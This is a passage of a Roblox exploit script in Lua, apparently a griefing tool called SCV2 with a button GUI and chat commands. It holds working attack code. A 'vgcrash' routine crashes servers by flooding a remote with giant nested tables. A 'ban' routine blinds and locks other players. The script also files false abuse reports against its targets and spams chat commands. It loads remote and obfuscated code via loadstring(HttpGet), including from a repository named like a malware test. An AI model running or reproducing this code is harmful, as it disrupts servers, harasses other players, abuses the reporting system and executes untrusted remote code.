        game.Players:Chat("h/ \n\n\n\n\n\n Slight change of plan. The server has closed, no more playing here \n\n\n\n\n\n")
        for i = 1, 128 do
            --task.wait()
            game.Players:Chat(
                "rocket/                                                                                                                                       me me me fuck"
            )
        end
    
        --task.wait(.5)
    
        for i = 1, 500 do
            task.wait()
            game.Players:Chat(
                "unpunish/                                                                                                                                     me me me fuck"
            )
        end
        wait(1)
        game.Players:Chat("clone me me me")
        task.spawn(function()
            if alreadyspammed then return end
            alreadyspammed = true
            for i = 1, 350 do
                game.Players:Chat("respawn/                                                                                                                                       others others others fuck")
            end
        end)
        wait(.49)
        for i = 1, 128 do
            task.wait()
            game.Players:Chat(
                "rocket/                                                                                                                                       all all all fuck"
            )
        end
    
        --task.wait(.5)
    
        for i = 1, 500 do
            task.wait()
            game.Players:Chat(
                "unpunish/                                                                                                                                     all all all fuck"
            )
        end
        chatt("clone all all all")
    end
end)

addcommand("ban",
"Ban a player",
function()
    for _Index, Target in pairs(GetPlayer(args[2])) do
        local id1 = 66254
        task.wait()
        if not game:GetService("Workspace").Terrain["_Game"].Admin:FindFirstChild("Regen") then
            chatt("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Failed to ban "..Target.Name.." \n Try a different method instead")
            game.Players:ReportAbuse(game:GetService("Players"),Target.Name,"Cheating/Exploiting", "Using a spam script to disrupt the chat for everyone")
            return
        end
        if string.match(game:HttpGet("https://inventory.roblox.com/v1/users/" .. Target.UserId .. "/items/GamePass/" .. id1), id1) then
            local playercount = game.Players:GetPlayers()
            if #playercount == 2 then
                if watermark then
                    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(watermarkmsg.." "..banwatermark.." "..Target.Name,"all")
                end
                trueblind()
                chatt("skydive                                                                                                                                  me me me")
                chatt("skydive                                                                                                                                  me me me")
                chatt("skydive                                                                                                                                  me me me");wait(.51)
                chatt(prefix3.."vgcrash");wait(.51)
                chatt(prefix3.."migrate")
                return 
            end
            chatt("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Failed to ban "..Target.Name.." \n Try a different method instead")
            print('Perm', Target.Name..' has perm in NBC')
            game.Players:ReportAbuse(game:GetService("Players"),Target.Name,"Cheating/Exploiting", "Spamming in the chat")
            return
        else
            if not banscript1 then
                noalteredp = true
                shared.sillock = {}
                shared.gravlock = {}
                banscript1 = true
                loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/my-own-scripts-projects/main/APIPART2.lua'),true))()
                wait()
                chatt("-lock "..Target.Name)
            else
                chatt("-lock "..Target.Name)
            end
        end
    end
end)

addcommand("vgcrash",
"Crash the server with the vampire gear",
function()
    chatt(":gear me "..antilog.."94794847")
    local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
    game.Players.LocalPlayer.Backpack:WaitForChild("VampireVanquisher")
    for _, v in ipairs(Backpack:GetChildren()) do
        v.Parent = game.Players.LocalPlayer.Character
        v:Activate()
    end

    wait(.15)
    task.spawn(function()
        while scriptrunning do
            chatt("unsize me me me");task.wait()
        end
    end)

    wait(1.01)

    for i = 1, 12 do
        local table1 = {}
        local table2 = {}

        local function loop(v1, v2)
            for i = v1, v2 do
                table.insert(table1, table2)
            end
        end

        local function crash(v1)
            for i = 1, v1 do
                table.insert(table2[1], {})
            end

            if 4999999 / (v1 + 2) then
                loop(1, 4999999 / (v1 + 2))
            else
                loop(1, 4999999)
            end
            game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(table1)
        end

        table.insert(table2, {})
        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
        crash(250)
        wait(3.51)
    end
end)

addcommand("iy",
"Load up infinite yield",
function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end
)

addcommand("classicmode",
"Load up old SCV2",
function()
    getgenv().prefix3 = "."
    logn('NEW SCV2 prefix changed to "."')
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Tech-187/Obfuscated-art/main/Legacy%20SCV2"))()
end
)

addcommand("house",
"Teleport to the house",
function()
    chatt("invis                                                                                                                                                               me "..math.random(1,1000).." fuck")
    wait(.49)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-28.6829948, 8.2299995, 66.4913253))
    wait(.49)
    chatt("vis                                                                                                                                                               me "..math.random(1,1000).." fuck")
end
)

connections[#connections + 1] = game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if string.sub(msg, 0, 3 + #prefix3) == prefix3.."lua" then
        local code = string.sub(msg, 5 + #prefix3)
        loadstring(code)()
    elseif string.sub(msg:lower(), 0, 5 + #prefix3) == prefix3.."unban" then
        local player = string.sub(msg:lower(), 7 + #prefix3)
        game.Players:Chat("-unlock "..player)
        wait(1.5)
        game.Players:Chat("respawn "..player)
        game.Players:Chat("tp "..player.." me")
    elseif string.sub(msg:lower(), 0, 4 + #prefix3) == prefix3.."spam" then
        local msggg = string.sub(msg:lower(), 6 + #prefix3)
        spam = true
        while spam and scriptrunning do task.wait()
            chatt(msggg)
        end
    elseif string.sub(msg:lower(), 0, 4 + #prefix3) == prefix3.."stop" or string.sub(msg:lower(), 0, 6 + #prefix3) == prefix3.."unspam" then
        spam = false
        colors = false
        shared.spam = false
        shared.spam1 = false
        shared.spam2 = false
        getgenv().spamm = false
        getgenv().spamm2 = false
    elseif string.sub(msg:lower(), 0, 8 + #prefix3) == prefix3.."mboombox" then
            local msggg = string.sub(msg:lower(), 10 + #prefix3)
            local tlrs = game.Players.LocalPlayer.Backpack:GetDescendants()
            local plrs = game:GetService("Players")
            local chr = plrs.LocalPlayer.Character

            for i,v in pairs(tlrs) do
                coroutine.wrap(function()
                    if v:IsA'Tool' then
                        function rng() return math.random(-128, 128) end
                        v.GripPos = Vector3.new(rng(), 1, rng());wait(0.25)
                        v.Parent = chr
                        wait(0.25)
                        v.Remote:FireServer("PlaySong", tonumber(msggg))
                    end
                end)()
            end
        end
    end)

task.spawn(function()
    while scriptrunning do task.wait(.1)
        if
            ws:FindFirstChild(game.Players.LocalPlayer.Name) and
                ws:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("Humanoid")
         then
            local L_1_ = workspace[game.Players.LocalPlayer.Name]
            if ELFRGD == true then
                if L_1_.Humanoid.Health == 0 then
                    chatt("reset me " .. math.random(1, 1000))
                    chatt("reset/me " .. math.random(1, 1000))
                    chatt("god                                                                                                                               me fuck " ..math.random(1, 1000))
                end
            end
        else
            repeat
                task.wait()
            until ws:FindFirstChild(game.Players.LocalPlayer.Name) and
                ws:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("Humanoid")
        end
    end
    if ELFRGD == true then
        if KGODglobal == true then
            return
        end
        pcall(
            function()
                getgenv().KGODglobal = true
            end
        )
        connections[#connections + 1] = game.Players.LocalPlayer.CharacterAdded:connect(function()
                task.wait(.65)
                chatt("god                                                                                                                               me fuck " ..math.random(1, 1000))
            end)
    end
end)

connections[#connections + 1] = rns.RenderStepped:Connect(function()
    if antiBlind == true then
        for i, v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
            if v.Name == "EFFECTGUIBLIND" then
                v:Destroy()
            end
        end
    end
    if colors == true then
        while colors do
            chatt("fogcolor " ..
            tostring(math.random(0, 255)) ..
                " " .. tostring(math.random(0, 255)) .. " " .. tostring(math.random(0, 255)))
            Utils.Task:wait()
        end
    end
end)

game.StarterGui.ResetPlayerGuiOnSpawn = false

function hasGamepass(plrId, id)
    local plrData = game:HttpGet("https://inventory.roblox.com/v1/users/" .. plrId .. "/items/GamePass/" .. id)
    local hasPerm = false
    if string.match(plrData, tostring(id)) then
        hasPerm = true
    end
    return hasPerm
end

PlayerList = Instance.new("ScreenGui")

coroutine.wrap(function()
        -- Instances:

        local PlayerListMaster = Instance.new("Frame")
        local SizeOffsetFrame = Instance.new("Frame")
        local UIListLayout = Instance.new("UIListLayout")
        local ScrollingFrameContainer = Instance.new("Frame")
        local UIListLayout_2 = Instance.new("UIListLayout")

        --Properties:

        PlayerList.Name = "PlayerList"
        PlayerList.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        PlayerList.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        PlayerList.DisplayOrder = 1

        PlayerListMaster.Name = "PlayerListMaster"
        PlayerListMaster.Parent = PlayerList
        PlayerListMaster.AnchorPoint = Vector2.new(1, 0)
        PlayerListMaster.BackgroundTransparency = 1.000
        PlayerListMaster.Position = UDim2.new(1, -4, 0, 40)
        PlayerListMaster.Size = UDim2.new(0, 166, 0.1, 0)

        SizeOffsetFrame.Name = "SizeOffsetFrame"
        SizeOffsetFrame.Parent = PlayerListMaster
        SizeOffsetFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        SizeOffsetFrame.BackgroundTransparency = 1.000
        SizeOffsetFrame.Position = UDim2.new(0.5, 0, 0.881410241, 0)
        SizeOffsetFrame.Size = UDim2.new(1, 0, 2.5, 0) -- {1, 0},{3.003, 0}

        UIListLayout.Parent = SizeOffsetFrame
        UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

        ScrollingFrameContainer.Name = "ScrollingFrameContainer"
        ScrollingFrameContainer.Parent = SizeOffsetFrame
        ScrollingFrameContainer.BackgroundColor3 = Color3.fromRGB(31, 33, 35)
        ScrollingFrameContainer.BackgroundTransparency = 0.300
        ScrollingFrameContainer.BorderSizePixel = 0
        ScrollingFrameContainer.LayoutOrder = 3
        ScrollingFrameContainer.Position = UDim2.new(0, 0, 0.0145454546, 0)
        ScrollingFrameContainer.Size = UDim2.new(1, 0, 0.883456707, 40)

        UIListLayout_2.Parent = ScrollingFrameContainer
        UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder

        -- Scripts:

        local function KTJYHGG_fake_script()
            local script = Instance.new("LocalScript", ScrollingFrameContainer)

            function addBox(isPerm, plrName, plrDisplay)
                local PlayerHere = Instance.new("Frame")
                local ChildrenFrame = Instance.new("Frame")
                local NameFrame = Instance.new("Frame")
                local DisplayName = Instance.new("Frame")
                local PlayerName = Instance.new("TextLabel")
                local SizeConstraint = Instance.new("UITextSizeConstraint")
                local PermUI = Instance.new("Frame")
                local PlayerName_2 = Instance.new("TextLabel")
                local SizeConstraint_2 = Instance.new("UITextSizeConstraint")
                local PlayerName_3 = Instance.new("Frame")
                local PlayerName_4 = Instance.new("TextLabel")
                local SizeConstraint_3 = Instance.new("UITextSizeConstraint")
                local Layout = Instance.new("UIListLayout")

                PlayerHere.Name = plrName
                PlayerHere.Parent = script.Parent
                PlayerHere.BackgroundTransparency = 1.000
                PlayerHere.ClipsDescendants = true
                PlayerHere.Size = UDim2.new(1, 0, 0.158816129, 0)

                ChildrenFrame.Name = "ChildrenFrame"
                ChildrenFrame.Parent = PlayerHere
                ChildrenFrame.BackgroundTransparency = 1.000
                ChildrenFrame.Size = UDim2.new(1, 0, 0, 40)

                NameFrame.Name = "NameFrame"
                NameFrame.Parent = ChildrenFrame
                NameFrame.BackgroundTransparency = 1.000
                NameFrame.Size = UDim2.new(0, 150, 0, 40)

                DisplayName.Name = "DisplayName"
                DisplayName.Parent = NameFrame
                DisplayName.BackgroundTransparency = 1.000
                DisplayName.LayoutOrder = 3
                DisplayName.Position = UDim2.new(0.0799999982, 0, 0, 0)
                DisplayName.Size = UDim2.new(0.639999986, -34, 1, 0)

                PlayerName.Name = "PlayerName"
                PlayerName.Parent = DisplayName
                PlayerName.BackgroundTransparency = 1.000
                PlayerName.Position = UDim2.new(0.439606011, 0, 0.704999983, 0)
                PlayerName.Size = UDim2.new(1, 0, 0.439999998, 0)
                PlayerName.Font = Enum.Font.GothamSemibold
                PlayerName.Text = plrDisplay
                PlayerName.TextColor3 = Color3.fromRGB(255, 255, 255)
                PlayerName.TextScaled = true
                PlayerName.TextSize = 14.000
                PlayerName.TextWrapped = true
                PlayerName.TextXAlignment = Enum.TextXAlignment.Left

                SizeConstraint.Name = "SizeConstraint"
                SizeConstraint.Parent = PlayerName
                SizeConstraint.MaxTextSize = 14
                SizeConstraint.MinTextSize = 9

                PermUI.Name = "PermUI"
                PermUI.Parent = NameFrame
                PermUI.BackgroundTransparency = 1.000
                PermUI.LayoutOrder = 3
                PermUI.Position = UDim2.new(0.0799999982, 0, 0, 0)
                PermUI.Size = UDim2.new(0.446666658, -34, 1, 0)

                PlayerName_2.Name = "PlayerName"
                PlayerName_2.Parent = PermUI
                PlayerName_2.BackgroundTransparency = 1.000
                PlayerName_2.Position = UDim2.new(0, 0, 0.280000001, 0)
                PlayerName_2.Size = UDim2.new(1, 0, 0.439999998, 0)
                PlayerName_2.Font = Enum.Font.GothamSemibold
                PlayerName_2.Text = "    "
                if isPerm then
                    PlayerName_2.Text = "Perm"
                end
                PlayerName_2.TextColor3 = Color3.fromRGB(255, 255, 255)
                PlayerName_2.TextScaled = true
                PlayerName_2.TextSize = 14.000
                PlayerName_2.TextWrapped = true
                PlayerName_2.TextXAlignment = Enum.TextXAlignment.Left

                SizeConstraint_2.Name = "SizeConstraint"
                SizeConstraint_2.Parent = PlayerName_2
                SizeConstraint_2.MaxTextSize = 14
                SizeConstraint_2.MinTextSize = 9

                PlayerName_3.Name = "PlayerName"
                PlayerName_3.Parent = NameFrame
                PlayerName_3.BackgroundTransparency = 1.000
                PlayerName_3.LayoutOrder = 3
                PlayerName_3.Size = UDim2.new(1, -34, 1, 0)

                PlayerName_4.Name = "PlayerName"
                PlayerName_4.Parent = PlayerName_3
                PlayerName_4.BackgroundTransparency = 1.000
                PlayerName_4.Position = UDim2.new(0.422413796, 0, 0.280000001, 0)
                PlayerName_4.Size = UDim2.new(1, 0, 0.439999998, 0)
                PlayerName_4.Font = Enum.Font.GothamSemibold
                PlayerName_4.Text = plrName
                PlayerName_4.TextColor3 = Color3.fromRGB(255, 255, 255)
                PlayerName_4.TextScaled = true
                PlayerName_4.TextSize = 14.000
                PlayerName_4.TextWrapped = true
                PlayerName_4.TextXAlignment = Enum.TextXAlignment.Left

                SizeConstraint_3.Name = "SizeConstraint"
                SizeConstraint_3.Parent = PlayerName_4
                SizeConstraint_3.MaxTextSize = 14
                SizeConstraint_3.MinTextSize = 9

                Layout.Name = "Layout"
                Layout.Parent = ChildrenFrame
                Layout.FillDirection = Enum.FillDirection.Horizontal
                Layout.SortOrder = Enum.SortOrder.Name
                Layout.VerticalAlignment = Enum.VerticalAlignment.Center
            end

            game.StarterGui:SetCoreGuiEnabled("PlayerList", false)

            connections[#connections + 1] = game.Players.ChildRemoved:Connect(function(player)
                    if script.Parent:FindFirstChild(player.Name) then
                        script.Parent:FindFirstChild(player.Name):remove()
                    end
                end)

            while wait(.65) do
                for _, plr in pairs(game.Players:GetChildren()) do
                    if not script.Parent:FindFirstChild(plr.Name) then
                        addBox(hasGamepass(plr.UserId, 66254 or 64354), plr.Name, plr.DisplayName)
                        task.wait()
                    --script.Parent.Size = UDim2.new(0, 166, 0, (#script.Parent:GetChildren() - 1) * 50)
                    end
                end
            end
        end
        coroutine.wrap(KTJYHGG_fake_script)()
    end
)()

-- Instances:

local SCv2_ButtonList = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
local UIGridLayout = Instance.new("UIGridLayout")
local UICorner = Instance.new("UICorner")
local CloseUI = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")

--Properties:

SCv2_ButtonList.Name = "SCv2_ButtonList"
SCv2_ButtonList.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
SCv2_ButtonList.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = SCv2_ButtonList
Frame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
Frame.BorderColor3 = Color3.fromRGB(33, 33, 33)
Frame.Position = UDim2.new(0.137755096, 0, 0.319999993, 0)
Frame.Size = UDim2.new(0, 262, 0, 25)

ScrollingFrame.Parent = Frame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
ScrollingFrame.BorderColor3 = Color3.fromRGB(33, 33, 33)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0.0152671756, 0, 1, 0)
ScrollingFrame.Size = UDim2.new(0, 254, 0, 300)
ScrollingFrame.CanvasSize = UDim2.new(1, 0, 3, 0)

UIGridLayout.Parent = ScrollingFrame
UIGridLayout.CellSize = UDim2.new(1, -10, 0, 25)

UICorner.CornerRadius = UDim.new(0, 2)
UICorner.Parent = Frame

CloseUI.Name = "CloseUI"
CloseUI.Parent = Frame
CloseUI.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
CloseUI.BackgroundTransparency = 1.000
CloseUI.BorderColor3 = Color3.fromRGB(33, 33, 33)
CloseUI.Position = UDim2.new(0.904511452, 0, -0.0300000012, 0)
CloseUI.Size = UDim2.new(0, 25, 0, 25)
CloseUI.Font = Enum.Font.SourceSans
CloseUI.Text = "X"
CloseUI.TextColor3 = Color3.fromRGB(0, 0, 0)
CloseUI.TextSize = 14.000

UICorner_2.CornerRadius = UDim.new(0, 2)
UICorner_2.Parent = CloseUI

-- Scripts:

local function NKEI_fake_script() -- ScrollingFrame.LocalScript 
	script = Instance.new('LocalScript', ScrollingFrame)

	local ClrPlt = {
		DefBk = Color3.fromRGB(33, 33 ,33),
		Enabled = Color3.fromRGB(44, 44, 44),
	}
	
	function addBtn(text, callback)
		local btn = Instance.new("TextButton", script.Parent)
		btn.BackgroundColor3 = ClrPlt.DefBk
		btn.BorderSizePixel = 0
		btn.Size = UDim2.new(0, 254, 0, 25)
		btn.Text = text
		btn.Name = text -- Order
		btn.TextSize = 14.000
		btn.TextColor3 = Color3.fromRGB(255, 255, 255)
		btn.MouseButton1Click:Connect(function()
			callback(btn)
		end)
	end
	
	function addTlg(text, callback_e, callback_d)
		addBtn(text, function(self)
			if self.BackgroundColor3 == ClrPlt.DefBk then
				self.BackgroundColor3 = ClrPlt.Enabled
				callback_e(self)
			else
				self.BackgroundColor3 = ClrPlt.DefBk
				callback_d(self)
			end
		end)
	end
	
	-- UI
	
	addTlg("Loopgrab/PadAbuse", function()
		padAbuse = true
	end, function()
		padAbuse = false
	end)

    addTlg("ClickExplode", function()
		clickExplode = true
	end, function()
		clickExplode = false
	end)

    addTlg("Visualizer", function()
		chatt("fogcolor 255 255 0")
        soundvis = true
        chatt("time 0")
        game:GetService("Workspace").Terrain["_Game"].Folder:WaitForChild("Sound")
        local loud = game:GetService("Workspace").Terrain["_Game"].Folder.Sound.PlaybackLoudness
        repeat
            if loud > 75 then
            else
                if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                    chatt("fogend "..game:GetService("Workspace").Terrain["_Game"].Folder.Sound.PlaybackLoudness / 4)
                else
                end
            end;wait()
        until soundvis == false
	end, function()
		soundvis = false
	end)
	
	addTlg("ClickAnnoy", function()
		clickAnnoy = true
	end, function()
		clickAnnoy = false
	end)

    addTlg("ClickFard", function()
		clickFard = true
	end, function()
		clickFard = false
	end)
	
	addBtn("DeleteResetPad", function(v)
		chatt(prefix3.."deleteregen")
	end)
	
	addBtn("RainbowPads", function(v)
		local speed = 32
		chatt("gear me "..antilog.."18474459")
		wait(1)
		game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.PaintBucket)
		wait(0.25)
		while true do
			for i = 0,1,0.001*speed do
				local clr = Color3.fromHSV(i,1,1)
				local padss = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
				for i, v in pairs(padss) do
					local jkfv = v.Head
					coroutine.wrap(function()
						if jkfv:IsA("Part") then
							local v1 =
							{
								["Part"] = jkfv,
								["Color"] = clr
							}
							game:GetService("Workspace")[game.Players.LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", v1)
						end
					end)()
				end
				wait(1 / 12) -- recolor the map x times a second lol.
			end
		end
	end)
	
	addBtn("Shutdown", function(v)
		chatt(prefix3.."vgcrash")
	end)

    addBtn("Silent Crash", function(v)
		chatt(prefix3.."silcrash")
	end)

    addBtn("House TP", function(v)
		chatt(prefix3.."house")
	end)
	
	addBtn("ServerHop", function(v)
		local x = {}
		for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/112420803/servers/Public?sortOrder=Asc&limit=100")).data) do
			if type(v) == "table" and v.maxPlayers > v.playing then
				x[#x + 1] = v.id
				amount = v.playing
			end
		end
		if #x > 0 then
			game:GetService("TeleportService"):TeleportToPlaceInstance(112420803, x[math.random(1, #x)])
		end
	end)
	
	addBtn("RegenPads", function(v)
		fireclickdetector(adminFlr.Regen.ClickDetector, 0)
	end)
	
	addBtn("NoObbyKill (NOK)", function(v)
		local objs = gameFlr.Workspace.Obby:GetChildren()
		for i, obj in pairs(objs) do
			coroutine.wrap(function()
				pcall(function()
					obj.TouchInterest:Destroy()
				end)
			end)()
		end
	end)

    addBtn("AntiPunish", function(v)
		if gamepassperm then
            chatt(prefix3.."permap")
        else
            chatt(prefix3.."nonpermap")
        end
	end)

    addBtn("*Commands", function(v)
		chatt(prefix3.."cmds")
	end)

    addBtn(
        "*Instant /c system",
        function(v)
            local invisGUIS = {}
            Players = game:GetService("Players")

            function FindInTable(tbl, val)
                if tbl == nil then
                    return false
                end
                for _, v in pairs(tbl) do
                    if v == val then
                        return true
                    end
                end
                return false
            end

            for i, v in pairs(Players.LocalPlayer:FindFirstChildWhichIsA("PlayerGui"):GetDescendants()) do
                if (v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ScrollingFrame")) and not v.Visible then
                    v.Visible = true
                    if not FindInTable(invisGUIS, v) then
                        table.insert(invisGUIS, v)
                    end
                end
            end
        end
    )
	
	local ELFRGD = false
	addTlg("AntiKill", function()
		chatt(prefix3.."antikill")
	end, function()
		chatt(prefix3.."unantikill")
	end)

    local ELFRGD = false
	addTlg("AntiBlind", function()
		antiBlind = true
	end, function()
		antiBlind = false
	end)
	
	local OELRDC = false
	addTlg("AutoHeal", function()
		OELRDC = true
		coroutine.wrap(function()
			pcall(function()
				while OELRDC and scriptrunning do wait(0.50)
					local hlth = game.Players.LocalPlayer.Character.Humanoid.Health
					if hlth ~= 0 and hlth ~= 100 then
						chatt("heal me 100")
					end
				end
			end)
		end)()
	end, function()
		OELRDC = false
	end)
	
	local size = UIGridLayout.AbsoluteContentSize -- Set GUI Virutal size
	ScrollingFrame.CanvasSize = UDim2.new(0, size.X, 0, size.Y)
end
coroutine.wrap(NKEI_fake_script)()
local function QIQVS_fake_script() -- CloseUI.LocalScript 
	script = Instance.new('LocalScript', CloseUI)

	script.Parent.MouseButton1Click:Connect(function()
		scriptrunning = false
        game.Players:Chat("v!noeditor")
        game.Players:Chat(prefix3.."noplayerlist");wait(.35)
        pcall(function()
            script.Parent.Parent.Parent:Destroy()
            game:GetService("StarterGui"):SetCoreGuiEnabled("PlayerList", true)
            PlayerList:Destroy()
        end)
        wait(.35)
        for _, connection in ipairs(connections) do
            connection:Disconnect()
        end
	end)
end
coroutine.wrap(QIQVS_fake_script)()
local function VGXONZ_fake_script() -- Frame.MguiD 
	local script = Instance.new('LocalScript', Frame)

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end
coroutine.wrap(VGXONZ_fake_script)()
local function EAZWOTE_fake_script() -- SCv2_ButtonList.MguiD 
	local script = Instance.new('LocalScript', SCv2_ButtonList)

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end
coroutine.wrap(EAZWOTE_fake_script)()
